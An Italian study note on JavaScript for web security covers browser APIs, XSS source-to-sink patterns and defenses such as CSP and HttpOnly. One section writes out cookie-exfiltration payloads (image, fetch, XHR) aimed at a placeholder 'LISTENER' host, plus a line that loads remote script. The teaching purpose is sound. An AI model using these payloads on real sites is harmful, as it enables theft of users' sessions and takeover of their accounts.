# JavaScript

> [!abstract] In una riga **JavaScript** è il linguaggio che gira **lato client** nel browser e ha pieno accesso al DOM, ai cookie e alla rete della pagina — il che lo rende sia il motore delle web app moderne sia il **payload** di ogni attacco XSS.

## Cos'è

JavaScript è un linguaggio interpretato, eseguito dal **motore del browser** (V8 in Chrome, SpiderMonkey in Firefox) all'interno del contesto di una pagina. Da quel contesto può:

- leggere e modificare il **DOM** (la struttura HTML della pagina)
- leggere i **cookie** non protetti da `HttpOnly`
- fare **richieste di rete** verso altri server
- accedere a `localStorage`, `sessionStorage`, URL, history…

È esattamente questa potenza ad essere l'obiettivo dello XSS: se un attaccante riesce a far eseguire il proprio JS nel browser della vittima, eredita **tutti** questi permessi nel contesto di quel sito (stesso _origin_).

> [!note] JS vs altri Per le differenze storiche con **VBScript / ActiveX / Ajax** vedi i concetti già chiariti: JS è cross-browser e standard (ECMAScript), VBScript/ActiveX erano legati a IE (in dismissione), Ajax è un _pattern_ d'uso di JS (request asincrone), non un linguaggio.

## Sintassi essenziale

```javascript
// Variabili
let x = "ciao";          // modificabile
const url = "http://s/"; // costante

// Stringhe: concatenazione vs template literal
let a = url + "?c=" + document.cookie;
let b = `${url}?c=${document.cookie}`;   // più leggibile

// Funzioni
function f(x) { return x * 2; }
const g = (x) => x * 2;   // arrow function

// Oggetti
let obj = { nome: "test", val: 1 };
obj.nome;        // accesso
```

## API rilevanti per la sicurezza

```javascript
document.cookie          // cookie della pagina (solo NON-HttpOnly)
document.location        // URL corrente (anche window.location.href)
document.body.innerHTML  // intero HTML della pagina
document.title
localStorage / sessionStorage
```

Queste sono le **sorgenti** tipiche da cui un payload estrae dati da esfiltrare.

## Tecniche out-of-band (esfiltrazione)

Far uscire dati verso un server controllato dall'attaccante. Pattern in ordine di praticità per XSS:

```javascript
// Image trick — corto, niente CORS, non gli importa della risposta
new Image().src = "http://LISTENER/?c=" + document.cookie;

// fetch — moderno, ma soggetto a CORS
fetch("http://LISTENER/?c=" + document.cookie);

// XMLHttpRequest — vecchio stile
var x = new XMLHttpRequest();
x.open("GET", "http://LISTENER/?c=" + document.cookie);
x.send();

// Caricare ed eseguire JS esterno
var s = document.createElement("script");
s.src = "http://LISTENER/payload.js";
document.head.appendChild(s);
```

Il **`new Image().src`** è il classico nei payload [[Blind XSS]]: brevissimo, nessuna dipendenza, bypassa CORS perché il browser lo tratta come semplice caricamento di immagine (una GET).

## Encoding utile

```javascript
encodeURIComponent(document.cookie)  // per caratteri speciali nell'URL
btoa("stringa")                       // base64 encode
atob("c3RyaW5n")                      // base64 decode
```

## Source → Sink (chiave del DOM-based XSS)

Il pericolo nasce quando un dato controllabile (**source**) finisce in una funzione che lo interpreta come codice/HTML (**sink**) senza escape:

|Source (input)|Sink (esecuzione)|
|---|---|
|`location.hash`, `location.search`|`innerHTML`, `outerHTML`|
|`document.referrer`|`document.write()`|
|`window.name`|`eval()`|
|`postMessage` data|`setTimeout("...")`|
|input dell'utente|`element.src` / `href`|

## Difese (lato sviluppatore)

- **Content Security Policy (CSP)** — blocca l'esecuzione di script inline e il caricamento da origin non whitelisted; mitiga gran parte dei payload XSS
- **Output encoding / escaping** — convertire `< > " '` in entità HTML prima di renderizzare input utente
- **`HttpOnly`** sui cookie di sessione — impedisce a `document.cookie` di leggerli (limita il _furto_, non l'impatto: lo script può comunque agire come la vittima)
- **Evitare i sink pericolosi** — preferire `textContent` a `innerHTML`, mai `eval()` su input non fidato
- **Sanitizzazione** con librerie dedicate (es. DOMPurify) quando serve renderizzare HTML

## ↔️ Collegamenti

- [[XSS]] — JS è il payload di ogni XSS
- [[Cookies]] — `document.cookie`, flag `HttpOnly`
- [[CSRF]] — confronto: CSRF non esegue JS sul target, sfrutta la sessione
- [[Web Hacking]]